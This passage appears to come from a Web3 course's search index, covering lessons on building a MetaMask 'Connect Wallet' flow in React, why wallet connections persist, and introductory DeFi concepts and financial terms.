have is a browser wallet like MetaMask. This is where it all begins. The first objective here is to conditionally render a button that prompts your user to Install MetaMask if window.ethereum does not exist. And we can achieve this using ternary operators in our JSX. We can then * embed* JavaScript expressions in our JSX very easily, so long as we wrap the logic in curly braces. <> { condition ? < Element to render if condition is true > : < Element to render if condition is false > } </> Open up App.js and you\u2019ll see the components InstallMetaMask , ConnectButton , and Account are imported, but they\u2019re commented out. Using ternary operators, go inside <main></main> , get ConnectButton to show up if window.ethereum is defined. If it is not defined, render InstallMetaMask . Now open the code sandbox in two windows\u2014 one where you have MetaMask installed, and one where you don\u2019t. See how on one browser there\u2019s a call to action to install MetaMask, and the other has a call to action to \u2728 Connect \u2728? <main> {window.ethereum ? <ConnectButton /> : <InstallMetaMask /> } </main>","title":"How Buidl?"},{"location":"S04-developer-tooling/M7-web3-frontend/L2-demystifying-connect-wallet/#state","text":"To get users connecting to your dApp, we\u2019ll need to call the [eth_requestAccounts](https://docs.metamask.io/guide/rpc-api.html#restricted-methods) JSON-RPC method from window.ethereum . In App.js , we\u2019re importing useState from React. The eth_requestAccounts method returns a promise. When that promise to grab a user\u2019s accounts resolves to an array, we\u2019ll need to hold onto it with the state hook . useState accepts an initial state but returns two values: the current state, and a function to update the state. Because our user hasn\u2019t connected yet, our initial state would be an empty string. The first value will be account , and the second will be setAccount . We can define this hook in App.js . When the promise resolves, we get the array, we\u2019ll want to hold it in state , which we\u2019ll achieve by calling setAccount . const [ account , setAccount ] = useState ( '' ) Now that we have that setup, we can \ud83d\udc40 define the function to connect \ud83d\udc40.","title":"State"},{"location":"S04-developer-tooling/M7-web3-frontend/L2-demystifying-connect-wallet/#asyncawait","text":"We\u2019ll need to define our function to connect asynchronously, rather than synchronously , because of the way functions in JavaScript behave. If eth_requestAccounts returns a promise, we\u2019ll want to wait for that promise to resolve before any other action in that function can be executed. We need to wait for our request to be sent to the blockchain through the nodes, then back to us to consume. Inside the function body, we can throw in a try/catch block. See the code below: const connect = async () => { try { // eth_requestAccounts } catch ( e ) { console . log ( e ) } } We can see here the connect function will now attempt to ask a user to connect, but anticipate failure. In the event of a failure, it will spit out an error code that can then be used to give feedback\u2014 in this case, we can prompt a user to retry connecting. If a user rejects the request to connect, this is where the catch will be triggered letting them know that they didn\u2019t approve the request. Next step is to create a variable and assign the eth_requestAccounts method to it. See the code below: const accounts = ( await window . ethereum . request ({ method : 'eth_requestAccounts' })[ 0 ] ` This is where we can tie up our connect functionality. Because we have an async function, we\u2019ll get to use the await statement on the method we\u2019ll want to wait for. The parentheses around the await statement followed by the [0] means once this promise is resolved and we get an array, we\u2019ll only want the first account. That\u2019s what our accounts variable will return, and that\u2019s what we\u2019ll use the setAccount function on. Your function should look like this: const connect = async () => { try { const accounts = ( await window . ethereum . request ({ method : \"eth_requestAccounts\" }) )[ 0 ]; setAccount ( accounts ); } catch ( e ) { console . log ( e ); } }; Once the function is defined, switch over to ConnectButton . As a React functional component, it takes the prop of connect . The next place you\u2019ll see connect being used in ConnectButton is in the return block, in <Button> , where it\u2019s being passed into handleClick . ConnectButton will be expecting the connect function that we can pass into it when we render it in <main></main> like so: < ConnectButton connect = { connect } /> The updated expression will look like this: <main> {window.ethereum ? <ConnectButton connect= {connect} /> : <InstallMetaMask /> } </main>","title":"Async/Await"},{"location":"S04-developer-tooling/M7-web3-frontend/L2-demystifying-connect-wallet/#showing-the-account","text":"Tried to click connect, connected successfully, and noticed you\u2019re still seeing the connect button? We\u2019re going to have to tweak our logic in the <main></main> element to reflect what sorcery we have going on in our app state right now. Up until this point, we had a binary condition to check for: if window.ethereum was injected into the browser. If you look back on account , it initially started as an empty string\u2014 one of the six falsy values in JavaScript. If a user has connected, it has a value as a 42-character long hexadecimal string. Ternary operators come in handy here because we can chain them. <> { firstCondition ? < Element to render if firstCondition is true > : secondCondition ? < Element to render if secondCondition is true > : < Element to render if secondCondition is false > } </> The first condition to check for can be account . If that is no longer an empty string, then we can render a <p> tag with the content of account . If it is still an empty string, we can check for window.ethereum . Perhaps the user doesn\u2019t have MetaMask installed, and that\u2019s why account is an empty string. So we can go show them ConnectButton if it was detected, and InstallMetaMask if it wasn\u2019t. Your updated expression should look like this: {account ? <p> {account} </p> : window.ethereum ? <ConnectButton connect= {connect} /> : <InstallMetaMask /> )} And now you should be able to see your address in its full glory. All 42 characters of it. This is great, but it feels a bit excessive, no?","title":"Showing the account"},{"location":"S04-developer-tooling/M7-web3-frontend/L2-demystifying-connect-wallet/#an-externally-owned-account-by-any-other-formatting-would-still-be-you","text":"We\u2019re not displaying embarrassing usernames or email addresses anymore. There\u2019s no longer a limit to how long your username can be. I mean, we\u2019re at 42 WHOLE characters long. Imagine displaying that on a mobile browser \ud83d\ude05. Thanks, but no thanks. As developers architecting a user experience in uncharted territory, we have to ask ourselves if we\u2019re overloading the user cognitively by displaying their address in its entirety. Consider the Serial Position Effect . Looking at your address, try to read out the characters before you lose your position. But you know you connected, if you check MetaMask, you\u2019ll see the first and last few digits are identical. The code you wrote helped connect a user. Is it really necessary to show the whole address? No. Not really. Ideally, you don\u2019t want a user spending too much time confirming that their address on a dApp matches what they know connected with. But you do want to show a portion of their address. Before you do anything, in <main> , let\u2019s swap the <p>{account}</p> for <Account account={account} /> . Now open up Account.js . The return block has a <Wrap> element, but <Blockie /> is commented out. Without uncommenting <Blockie /> , add {account} inside <Wrap> . You\u2019ll still see the whole address, but we have some styling. So we have that going for us, which is nice. But it doesn\u2019t fix our problem of how to display an address. What we need to do is\u2026 truncate it. Just a smidge. To the first six and last four characters, to be more specific. The first six account for the leading 0x , which is the hash prefix, plus the next four characters. We can define a function called formatAddress that takes the argument of a user\u2019s address. Because the address is a string, we can use the substr() method to return portions of it. BUT\u2026 we need to separate those portions too. What we\u2019ll return is a template literal with the first substring, followed by ellipses, and then the second substring. Your function should look like this: const formatAddress = ( addr ) => { return ` $ { addr . substr ( 0 , 6 )} ...$ { addr . substr ( - 4 )} ` ; }; Now you can add a <p> tag inside Wrap , and inside that <p> tag, you can add {formatAddress(address)} . Looks a lot better, right? But we\u2019re not done yet. There\u2019s something even cooler we can add.","title":"An externally owned account by any other formatting\u2026 would still be you."},{"location":"S04-developer-tooling/M7-web3-frontend/L2-demystifying-connect-wallet/#identicon","text":"If you open up MetaMask and look on the right, you\u2019ll see a little pixelated icon. Depending on your settings, you might be seeing a Jazzicon or a Blockie . If you change accounts on MetaMask, it also changes. That\u2019s because it\u2019s unique to you. It was generated from your address. There can be as many variations of Jazzicons or Blockies as there can be addresses. So now it can be used as a digital representation of your address. When a user sees what their identicon looks like on MetaMask, it would be helpful to see what it would also look like on your dApp as a subtle visual confirmation that they are using the correct account. Take a look at <Blockie /> . Right now it takes the props of size and scale , but those are just for styling. What we\u2019ll want to pass in is a seed , which will determine how our blockie is generated. All we need to do is pass in our address as the seed. Hit save. I know. Cool, right? That simple. Here\u2019s what your Account.js should look like: const Account = ({ account }) => { const formatAddress = (addr) => { return ` ${ addr . substr ( 0 , 6 ) } ... ${ addr . substr ( - 4 ) } `; }; return ( <Wrap> <Blockies seed= {account} size= {10} scale= {3} /> <p> {formatAddress(account)} </p> </Wrap> ); };","title":"Identicon"},{"location":"S04-developer-tooling/M7-web3-frontend/L2-demystifying-connect-wallet/#you-can-disconnect-but-you-can-never-leave-maybe","text":"So far, the bases you\u2019ve covered include onboarding a user. Allowing them to connect. And showing that they\u2019ve connected. But what about when they leave your dApp? Go ahead and refresh the page. See how it doesn\u2019t show your address anymore? Now click connect. Notice now how MetaMask didn\u2019t even popup, but your address shows up right away? But wait, get this. Open up MetaMask. We\u2019re still connected? Try connecting to a known dApp. Now refresh. Address still there? Let\u2019s dig around a bit, some of these dApps will let you disconnect. Re-read that sentence. Now try to disconnect, if there\u2019s a button for it. You won\u2019t see your address anymore, great. But go check MetaMask. You\u2019re still connected. I know. I know. Your users will be expecting a button to log out, it seems only rational. And you have to look them in the eyes, wistfully, and say, no\u2026 no, I\u2019m sorry, things work a bit differently in the wonderland that is Web3. Go look in /components , there\u2019s no component for a button to log out. Not only that but your users will remain connected and you have to explain this to them because this is unlike any good experience they ever had on an application before. So what is actually going on? Your users are connected until they\u2019re not\u2014 even if they refresh their browser, clear their cache, cookies and browser data. In the next lesson we\u2019ll cover why your user stays connected.","title":"You can disconnect, but you can never leave\u2026 Maybe"},{"location":"S04-developer-tooling/M7-web3-frontend/L3-persisting-connectivity/","text":"Persisting Connectivity in Web3 with useEffect This lesson builds on the CodeSandbox example from \u201cA Demystification of \u201cConnect Wallet\u201d What actually happens when you leave a dApp and why are you still connected? For this, let\u2019s hop in a time machine. The year is 2006. You\u2019ve just spent the last three hours fine-tuning the spaghetti code that makes up your MySpace layout to show off to all the new frens you got from that bulletin board S4S. You\u2019re good at this, way ahead of your time. You do this all in Notepad\u2014 in plain text with no syntax highlighting. Life is good until you receive a seemingly innocuous email prompting you to visit MySpace with a strange URL. On login, the site looks a little different. By the way, you did log in. It didn\u2019t take you back to MySpace, so you open up a new window and see that now your whole bulletin board is flooded with spam from your account. The credentials you used to log in don\u2019t work anymore. Your layout is broken now and your profile photo has changed. You were the victim of a phishing attack . It happens all too often, unfortunately. You get emails telling you that something completely out of your control, and sometimes beyond your comprehension, has happened to your account, here\u2019s how you can fix it . Phishing attacks have bamboozled users online since the time you were able to get a 30-day free trial of \u2728the internet\u2728from an AOL floppy disk . We can try to rely on a site logging us in automatically to circumvent this attack because when a site logs us in automatically, it does us a few favors. It reduces the password fatigue that has already burnt us out. And it reminds us to take a step back from this email and visit the site with a URL we know and trust to make sure everything is okay. If the site remembers us, we should be okay, right? Just because we can try to rely on auto-login doesn\u2019t mean we should. We\u2019re really relying on the possibility a site may allow for that. That our browser data wasn\u2019t purged. The problem is that it\u2019s not set in stone, we don\u2019t know if we\u2019ll always be logged in. But wait, it can get worse. Auto-login is not entirely a good thing to rely on. If your device ends up in the wrong hands, now whoever has it can also access the same sites that promised to remember you. It\u2019s no longer a convenience at that point, but an attack vector. Why do you stay connected? Phishing never really went away. It just got smarter . Now the stakes are higher because real assets are involved. If you force quit and restart your browser. Notice how the button still says \u2018Connect\u2019. Click it and it should open MetaMask, now you have to enter your password for MetaMask because you were logged out. But, do you notice how you\u2019ve connected to the dApp again, and you didn\u2019t have to select an account to connect with? If you don\u2019t remember disconnecting or logging out, it\u2019s because you didn\u2019t. Your session wasn\u2019t retained in local storage, but after restarting your browser, you were logged out of MetaMask\u2014 this is by design. Your device can fall into the wrong hands, but unless they know your password for MetaMask, your private key, or your mnemonic phrase, they can\u2019t do anything. They can\u2019t even get your private key or mnemonic phrase from MetaMask because they need your password! But wait, there\u2019s more! The only reason why you will ever need to use your private key or mnemonic phrase is if you\u2019re importing accounts from other wallets. You don\u2019t use it often like regular credentials and are encouraged to store it in some place like a safety deposit box, (or entombed in concrete) . In the meantime, here\u2019s what your junk mailbox can get filled with. *Benny Hill theme intensifies* {target=_blank} By default, you\u2019ll always be connected because you didn\u2019t need to verify your identity for authentication. The mere fact that your account was generated from a number so large that it could not be manmade is proof enough that your account is authentic. The reason why you stay connected is that you granted this dApp permission to view your accounts, and your assets and suggest transactions on your behalf. Restarting your browser, clearing your session, and clearing your cookies and cache doesn\u2019t disconnect you. Because MetaMask and other browser wallets act as this bridge between you and dApps, it supplies the functionality for dApps to check if you have granted permissions with your account with the Ethereum Provider API. Malicious actors can then fork popular protocols and spin up their own versions and deceive you into thinking you might be interacting with the real protocol, but you\u2019re greeted with a new user flow as if permissions only you could grant and revoke were automatically granted and revoked for you, without your explicit consent. This is why connectivity and permissions in Web3.0 is a paradigm shift from traditional authentication flows in Web2.0. Showing your user\u2019s connectivity To display this persistent connectivity with React, we\u2019ll need to make a few more tweaks. For this, we can use the Effect hook. React components are dynamic because of their ability to go through different lifecycles . You'll commonly see the phrase \"side effect\" used in explanations for useEffect , so a side effect of the Ethereum Provider API being present in the window results in either the \u2018Connect\u2019 button or the \u2018Address\u2019 component being rendered. In App.js you\u2019ll see we\u2019re already importing useEffect from React. Now we can define it right beneath our useState hook like this: useEffect(() => { // Callback function }, []) // Dependency array Logic can fire off in a component where we\u2019re using useEffect and it can change state, and ultimately how our components and our app look. That array is where you have a variable that needs to change before the callback function can fire off. So perhaps we\u2019re waiting on something to exist, like say\u2026 an Ethereum provider, we can then fire off a callback function in our useEffect to show the address that a user has connected with. First, you\u2019ll need to destructure the window object to unpack the ethereum property and define it as its own variable like this: const { ethereum } = window And then let\u2019s quickly change wherever we have window.ethereum to ethereum , like in our connect function: const accounts = ( await ethereum . request ({ method : \"eth_requestAccounts\" }) await window . ethereum . request ({ method : \"eth_requestAccounts\" }) )[ 0 ]; And also in our <main> element: <main> {account ? <Account address= {account} /> : ethereum ? <ConnectButton connect= {connect} /> : <InstallMetaMask /> )} </main> Now let\u2019s go back to the useEffect . We know at some point, on load, the Ethereum Provider in our window will return an object, but until it does, we want to hold off on firing any logic. So now we can throw that into our dependency array like this: useEffect (() => { // Logic will fire off here if Ethereum changes from undefined to defined . } , [ ethereum ] ) Why did we unpack ethereum from window ? Using window.ethereum in our dependency array would break one of the rules of React Hooks. This would trigger the react-hooks/exhaustive-deps warning that tells us that window.ethereum is an outer scope value, and that changing it will not re-render the component. For a while, we were checking if window.ethereum existed, if console logging it would return a truthy value. If it doesn\u2019t exist, the value returned will be false. But we were never checking if it changed while it was in the window , or if the window as a whole changed. What if window does change, but ethereum doesn\u2019t? This is where the issue of it being an outer scope value comes into play because we\u2019re relying on ethereum while it\u2019s inside window , instead of ethereum when it\u2019s defined on its own. We\u2019ll see a scenario where a side effect turns into a butterfly effect as one rabid dependency triggers a series of unfortunate re-renders. We don\u2019t want this, so react-hooks/exhaustive-deps fire off to let us know we may end up with this kind of behavior. Next, we can call the JSON-RPC method: eth_accounts . We don\u2019t have to request accounts from a user because they already granted our dApp permission. We instead get to see if they\u2019ve connected with the account they are currently using. This is another promise that returns an array. So we\u2019ll have to use the same syntax with await that we used with our connect function, like this: useEffect (() => { ( async () => { // Why it look like that ser ? } )() } , [ ethereum ] ) This looks the way it does because it is an async IIFE, an immediately invoked function expression . The parentheses have a job title now as a \u2018grouping operator\u2019, and this is where we throw in our logic. Then the second set of parentheses at the end is where we immediately call that anonymous function. Because we aren\u2019t reusing this function anywhere else at the moment, we don\u2019t need to explicitly name it. Inside our IIFE, we can throw in a try/catch block. useEffect (() => { ( async () => { try { // You ' ve done this before } catch ( e ) {} } )() } , [ ethereum ] ) And now we can make that API call: useEffect (() => { ( async () => { try { const connectedAccount = ( await ethereum . request ( { method : 'eth_accounts' } ) [ 0 ] setAccount ( connectedAccount ); } catch ( e ) { console . log ( e ) } } )() } , [ ethereum ] ) As long as you haven\u2019t revoked permissions, you should see immediately that the <Account /> component with your address is present. On refresh, it\u2019ll still be there. All up until you manually disconnect with MetaMask\u2014 and then strangely, notice how the <Account /> component is still present? This might be confusing for your users who are expecting a \u2018Disconnect\u2019 button to replace a logout button. But if you look for it in components, there isn\u2019t one there. We simply don\u2019t have one. This is also by design, you see, a dApp can\u2019t facilitate this request to just revoke the permissions you granted. It doesn\u2019t have permission to do so because it\u2019s not you. You can stay connected, but even then transactions cannot be approved and messages cannot be signed without you, as the private key holder, confirming them. If your user takes a certain action like disconnecting, and they\u2019re doing that through MetaMask, the dApp frontend needs to know what just occurred, and what to do next. In the next lesson, we\u2019ll cover event listeners with the Ethereum Provider API. Additional Reading (or just references) Ethereum Provider API A Guide to React's useEffect hook A Complete Guide to useEffect","title":"Persisting Connectivity in Web3 with useEffect"},{"location":"S04-developer-tooling/M7-web3-frontend/L3-persisting-connectivity/#persisting-connectivity-in-web3-with-useeffect","text":"This lesson builds on the CodeSandbox example from \u201cA Demystification of \u201cConnect Wallet\u201d What actually happens when you leave a dApp and why are you still connected? For this, let\u2019s hop in a time machine. The year is 2006. You\u2019ve just spent the last three hours fine-tuning the spaghetti code that makes up your MySpace layout to show off to all the new frens you got from that bulletin board S4S. You\u2019re good at this, way ahead of your time. You do this all in Notepad\u2014 in plain text with no syntax highlighting. Life is good until you receive a seemingly innocuous email prompting you to visit MySpace with a strange URL. On login, the site looks a little different. By the way, you did log in. It didn\u2019t take you back to MySpace, so you open up a new window and see that now your whole bulletin board is flooded with spam from your account. The credentials you used to log in don\u2019t work anymore. Your layout is broken now and your profile photo has changed. You were the victim of a phishing attack . It happens all too often, unfortunately. You get emails telling you that something completely out of your control, and sometimes beyond your comprehension, has happened to your account, here\u2019s how you can fix it . Phishing attacks have bamboozled users online since the time you were able to get a 30-day free trial of \u2728the internet\u2728from an AOL floppy disk . We can try to rely on a site logging us in automatically to circumvent this attack because when a site logs us in automatically, it does us a few favors. It reduces the password fatigue that has already burnt us out. And it reminds us to take a step back from this email and visit the site with a URL we know and trust to make sure everything is okay. If the site remembers us, we should be okay, right? Just because we can try to rely on auto-login doesn\u2019t mean we should. We\u2019re really relying on the possibility a site may allow for that. That our browser data wasn\u2019t purged. The problem is that it\u2019s not set in stone, we don\u2019t know if we\u2019ll always be logged in. But wait, it can get worse. Auto-login is not entirely a good thing to rely on. If your device ends up in the wrong hands, now whoever has it can also access the same sites that promised to remember you. It\u2019s no longer a convenience at that point, but an attack vector.","title":"Persisting Connectivity in Web3 with useEffect"},{"location":"S04-developer-tooling/M7-web3-frontend/L3-persisting-connectivity/#why-do-you-stay-connected","text":"Phishing never really went away. It just got smarter . Now the stakes are higher because real assets are involved. If you force quit and restart your browser. Notice how the button still says \u2018Connect\u2019. Click it and it should open MetaMask, now you have to enter your password for MetaMask because you were logged out. But, do you notice how you\u2019ve connected to the dApp again, and you didn\u2019t have to select an account to connect with? If you don\u2019t remember disconnecting or logging out, it\u2019s because you didn\u2019t. Your session wasn\u2019t retained in local storage, but after restarting your browser, you were logged out of MetaMask\u2014 this is by design. Your device can fall into the wrong hands, but unless they know your password for MetaMask, your private key, or your mnemonic phrase, they can\u2019t do anything. They can\u2019t even get your private key or mnemonic phrase from MetaMask because they need your password! But wait, there\u2019s more! The only reason why you will ever need to use your private key or mnemonic phrase is if you\u2019re importing accounts from other wallets. You don\u2019t use it often like regular credentials and are encouraged to store it in some place like a safety deposit box, (or entombed in concrete) . In the meantime, here\u2019s what your junk mailbox can get filled with. *Benny Hill theme intensifies* {target=_blank} By default, you\u2019ll always be connected because you didn\u2019t need to verify your identity for authentication. The mere fact that your account was generated from a number so large that it could not be manmade is proof enough that your account is authentic. The reason why you stay connected is that you granted this dApp permission to view your accounts, and your assets and suggest transactions on your behalf. Restarting your browser, clearing your session, and clearing your cookies and cache doesn\u2019t disconnect you. Because MetaMask and other browser wallets act as this bridge between you and dApps, it supplies the functionality for dApps to check if you have granted permissions with your account with the Ethereum Provider API. Malicious actors can then fork popular protocols and spin up their own versions and deceive you into thinking you might be interacting with the real protocol, but you\u2019re greeted with a new user flow as if permissions only you could grant and revoke were automatically granted and revoked for you, without your explicit consent. This is why connectivity and permissions in Web3.0 is a paradigm shift from traditional authentication flows in Web2.0.","title":"Why do you stay connected?"},{"location":"S04-developer-tooling/M7-web3-frontend/L3-persisting-connectivity/#showing-your-users-connectivity","text":"To display this persistent connectivity with React, we\u2019ll need to make a few more tweaks. For this, we can use the Effect hook. React components are dynamic because of their ability to go through different lifecycles . You'll commonly see the phrase \"side effect\" used in explanations for useEffect , so a side effect of the Ethereum Provider API being present in the window results in either the \u2018Connect\u2019 button or the \u2018Address\u2019 component being rendered. In App.js you\u2019ll see we\u2019re already importing useEffect from React. Now we can define it right beneath our useState hook like this: useEffect(() => { // Callback function }, []) // Dependency array Logic can fire off in a component where we\u2019re using useEffect and it can change state, and ultimately how our components and our app look. That array is where you have a variable that needs to change before the callback function can fire off. So perhaps we\u2019re waiting on something to exist, like say\u2026 an Ethereum provider, we can then fire off a callback function in our useEffect to show the address that a user has connected with. First, you\u2019ll need to destructure the window object to unpack the ethereum property and define it as its own variable like this: const { ethereum } = window And then let\u2019s quickly change wherever we have window.ethereum to ethereum , like in our connect function: const accounts = ( await ethereum . request ({ method : \"eth_requestAccounts\" }) await window . ethereum . request ({ method : \"eth_requestAccounts\" }) )[ 0 ]; And also in our <main> element: <main> {account ? <Account address= {account} /> : ethereum ? <ConnectButton connect= {connect} /> : <InstallMetaMask /> )} </main> Now let\u2019s go back to the useEffect . We know at some point, on load, the Ethereum Provider in our window will return an object, but until it does, we want to hold off on firing any logic. So now we can throw that into our dependency array like this: useEffect (() => { // Logic will fire off here if Ethereum changes from undefined to defined . } , [ ethereum ] )","title":"Showing your user\u2019s connectivity"},{"location":"S04-developer-tooling/M7-web3-frontend/L3-persisting-connectivity/#why-did-we-unpack-ethereum-from-window","text":"Using window.ethereum in our dependency array would break one of the rules of React Hooks. This would trigger the react-hooks/exhaustive-deps warning that tells us that window.ethereum is an outer scope value, and that changing it will not re-render the component. For a while, we were checking if window.ethereum existed, if console logging it would return a truthy value. If it doesn\u2019t exist, the value returned will be false. But we were never checking if it changed while it was in the window , or if the window as a whole changed. What if window does change, but ethereum doesn\u2019t? This is where the issue of it being an outer scope value comes into play because we\u2019re relying on ethereum while it\u2019s inside window , instead of ethereum when it\u2019s defined on its own. We\u2019ll see a scenario where a side effect turns into a butterfly effect as one rabid dependency triggers a series of unfortunate re-renders. We don\u2019t want this, so react-hooks/exhaustive-deps fire off to let us know we may end up with this kind of behavior. Next, we can call the JSON-RPC method: eth_accounts . We don\u2019t have to request accounts from a user because they already granted our dApp permission. We instead get to see if they\u2019ve connected with the account they are currently using. This is another promise that returns an array. So we\u2019ll have to use the same syntax with await that we used with our connect function, like this: useEffect (() => { ( async () => { // Why it look like that ser ? } )() } , [ ethereum ] ) This looks the way it does because it is an async IIFE, an immediately invoked function expression . The parentheses have a job title now as a \u2018grouping operator\u2019, and this is where we throw in our logic. Then the second set of parentheses at the end is where we immediately call that anonymous function. Because we aren\u2019t reusing this function anywhere else at the moment, we don\u2019t need to explicitly name it. Inside our IIFE, we can throw in a try/catch block. useEffect (() => { ( async () => { try { // You ' ve done this before } catch ( e ) {} } )() } , [ ethereum ] ) And now we can make that API call: useEffect (() => { ( async () => { try { const connectedAccount = ( await ethereum . request ( { method : 'eth_accounts' } ) [ 0 ] setAccount ( connectedAccount ); } catch ( e ) { console . log ( e ) } } )() } , [ ethereum ] ) As long as you haven\u2019t revoked permissions, you should see immediately that the <Account /> component with your address is present. On refresh, it\u2019ll still be there. All up until you manually disconnect with MetaMask\u2014 and then strangely, notice how the <Account /> component is still present? This might be confusing for your users who are expecting a \u2018Disconnect\u2019 button to replace a logout button. But if you look for it in components, there isn\u2019t one there. We simply don\u2019t have one. This is also by design, you see, a dApp can\u2019t facilitate this request to just revoke the permissions you granted. It doesn\u2019t have permission to do so because it\u2019s not you. You can stay connected, but even then transactions cannot be approved and messages cannot be signed without you, as the private key holder, confirming them. If your user takes a certain action like disconnecting, and they\u2019re doing that through MetaMask, the dApp frontend needs to know what just occurred, and what to do next. In the next lesson, we\u2019ll cover event listeners with the Ethereum Provider API.","title":"Why did we unpack ethereum from window?"},{"location":"S04-developer-tooling/M7-web3-frontend/L3-persisting-connectivity/#additional-reading-or-just-references","text":"Ethereum Provider API A Guide to React's useEffect hook A Complete Guide to useEffect","title":"Additional Reading (or just references)"},{"location":"S05a-defi/M0-concepts/","text":"Second-Order Effects We're calling the next two sections \"second-order effects.\" This name comes from our mental model and framework we've been building for the course. Initially, we learned about the fundamental primitives underlying the blockchain world. Next, we saw how protocols tied those primitives together. Then, we saw how smart contracts introduce a way to create autonomous programs to operate within the trustless networks the protocols created. In the next two sections, DeFi and DAOs, we'll see the structures that emerge from the smart contract building blocks we've just learned about. Please note, these are both very new and very specific fields. Some of the material may be overwhelming, but don't worry! Our only goal is to give you a point of reference if you encounter these ideas in the wild. We also hope it will show you some of the interesting things that can happen when we start to blend the world of smart contracts with messy human existence. While the next few sections are heavy on DeFi, please know that there is more to blockchain than DeFi! In fact, there's a danger in getting caught up in the small world of DeFi and missing the larger elements of social coordination made possible by blockchain. That's why we're also discussing DAOs, a topic that has more recently come into an interesting maturity. We'll explore the ways in which DAOs are extending the reach of blockchain and, perhaps, social coordination. Let's dive in!","title":"Second-Order Effects"},{"location":"S05a-defi/M0-concepts/#second-order-effects","text":"We're calling the next two sections \"second-order effects.\" This name comes from our mental model and framework we've been building for the course. Initially, we learned about the fundamental primitives underlying the blockchain world. Next, we saw how protocols tied those primitives together. Then, we saw how smart contracts introduce a way to create autonomous programs to operate within the trustless networks the protocols created. In the next two sections, DeFi and DAOs, we'll see the structures that emerge from the smart contract building blocks we've just learned about. Please note, these are both very new and very specific fields. Some of the material may be overwhelming, but don't worry! Our only goal is to give you a point of reference if you encounter these ideas in the wild. We also hope it will show you some of the interesting things that can happen when we start to blend the world of smart contracts with messy human existence. While the next few sections are heavy on DeFi, please know that there is more to blockchain than DeFi! In fact, there's a danger in getting caught up in the small world of DeFi and missing the larger elements of social coordination made possible by blockchain. That's why we're also discussing DAOs, a topic that has more recently come into an interesting maturity. We'll explore the ways in which DAOs are extending the reach of blockchain and, perhaps, social coordination. Let's dive in!","title":"Second-Order Effects"},{"location":"S05a-defi/M1-intro/L1-what-is-defi/","text":"What is DeFi? Finance is defined as the management of money and includes activities like saving, borrowing, lending, investing, budgeting, and forecasting. Finance can be seen as a societal tool to manage resources, risk, and rewards across space and time between entities. Decentralized Finance (DeFi) is a term used for software built on programmable open-source blockchains using smart contracts. The aim is to transform traditional financial products into reliable, permissionless, transparent, and censorship-resistant protocols without centralized intermediaries. In some ways, DeFi protocol devs are writing firmware for scalable social collaboration and resource allocation. They extend the internet of value to more complex activities. DeFi protocols share three interesting characteristics among many: Interoperability: The ability to share data and work with each other Composability: money legos, aka they be used in different ways to create new things Immutability: the inability for the core logic to be changed, allowing for more trust. Permissionless: the ability to interact with a protocol without third party permission Auditable: the history of its activities can be investigated by anyone These properties give developers the ability to string together a series of protocols to create new and exciting applications. DeFi also addresses issues in centralized finance related to: Centralized control Limited access and options Lack of interoperability and portability Lack of Transparency High cost Misaligned incentives DeFi apps aim to increase choice, innovation, access, efficiency, speed, transparency, auditability and autonomy while lowering the costs of doing business and reducing systemic risk from too big to fail entities. Anyone with an internet connection can access DeFi Apps and protocols, extending the internet of information to the \u201cinternet of value\u201d. Additional Material Book: How to DeFi from Coin Gecko Article: Defiant: What is Decentralized Finance? Article: The Defiant\u2019s Definitive Guide to DeFi Academic: Decentralized Finance (Federal Reserve) Yes, that Federal Reserve. Like, the real one! Video: Blockchain@Berkeley: DeFi Article: Are You Trading or Gambling? Important to know the difference before \"investing\" in DeFi! GitHub: DeFi Studies Collection of DeFi articles","title":"What is DeFi?"},{"location":"S05a-defi/M1-intro/L1-what-is-defi/#what-is-defi","text":"Finance is defined as the management of money and includes activities like saving, borrowing, lending, investing, budgeting, and forecasting. Finance can be seen as a societal tool to manage resources, risk, and rewards across space and time between entities. Decentralized Finance (DeFi) is a term used for software built on programmable open-source blockchains using smart contracts. The aim is to transform traditional financial products into reliable, permissionless, transparent, and censorship-resistant protocols without centralized intermediaries. In some ways, DeFi protocol devs are writing firmware for scalable social collaboration and resource allocation. They extend the internet of value to more complex activities. DeFi protocols share three interesting characteristics among many: Interoperability: The ability to share data and work with each other Composability: money legos, aka they be used in different ways to create new things Immutability: the inability for the core logic to be changed, allowing for more trust. Permissionless: the ability to interact with a protocol without third party permission Auditable: the history of its activities can be investigated by anyone These properties give developers the ability to string together a series of protocols to create new and exciting applications. DeFi also addresses issues in centralized finance related to: Centralized control Limited access and options Lack of interoperability and portability Lack of Transparency High cost Misaligned incentives DeFi apps aim to increase choice, innovation, access, efficiency, speed, transparency, auditability and autonomy while lowering the costs of doing business and reducing systemic risk from too big to fail entities. Anyone with an internet connection can access DeFi Apps and protocols, extending the internet of information to the \u201cinternet of value\u201d.","title":"What is DeFi?"},{"location":"S05a-defi/M1-intro/L1-what-is-defi/#additional-material","text":"Book: How to DeFi from Coin Gecko Article: Defiant: What is Decentralized Finance? Article: The Defiant\u2019s Definitive Guide to DeFi Academic: Decentralized Finance (Federal Reserve) Yes, that Federal Reserve. Like, the real one! Video: Blockchain@Berkeley: DeFi Article: Are You Trading or Gambling? Important to know the difference before \"investing\" in DeFi! GitHub: DeFi Studies Collection of DeFi articles","title":"Additional Material"},{"location":"S05a-defi/M1-intro/L2-key-terms/","text":"Key Terms To understand decentralized finance, we must first understand some key terms in finance. Then we can look into the essential key terms that are unique to DeFi. As mentioned, finance can be defined as the \"study of systems of money, investments, and other financial instruments\". It can be seen as a societal tool to manage resources nominated in money, risk, and rewards across space and time between entities. DeFi upgrades this to occur on the \"internet of value\" via programmable blockchains like Ethereum with protocols written in smart contracts. Economics in 30 seconds A key foundation of finance is economics which deals with how people interact with value , specifically the production, distribution, and consumption of goods and services. Core to this idea is the concept of scarcity , or simply the gap between limited resources and unlimited wants. To solve this problem, we look towards allocating resources to the most productive uses. We use market-based systems based on property rights to allow individual entities to own and allocate resources to where they best see fit. From this arises supply and demand, another central idea in economics. In finance, scarcity, allocation and supply and demand translate into deploying limited amounts of capital across a range of possible investments. As we will see later, smart contract based systems make it easy to enforce and audit ownership, and what owners can do with their digital assets. Key Financial Terms That Appear in DeFi Finance extends economics to the management of money and investments. Money has certain properties , some of which is the ability to quantify and transfer value. The most common example of money is fiat currency , a type of money a government has declared legal tender that allows for the settlement of private or public debts within a political jurisdiction. Examples of fiat currencies are the United States Dollar $, European Union's Euro \u20ac, The People's Republic of China's Renminbi RMB, Japanese Yen \u00a5, South African Rand R. Once we have money, we want to grow it. This is because inflation slowly eats away at the value of money. A dollar today is worth less than a dollar 20 years ago. So we must invest our money to keep up. In finance, that means investing in financial instruments defined as assets or bundles of capital represented by real or virtual documents. Not all opportunities or financial assets are equal. Out of this emerges a central idea in 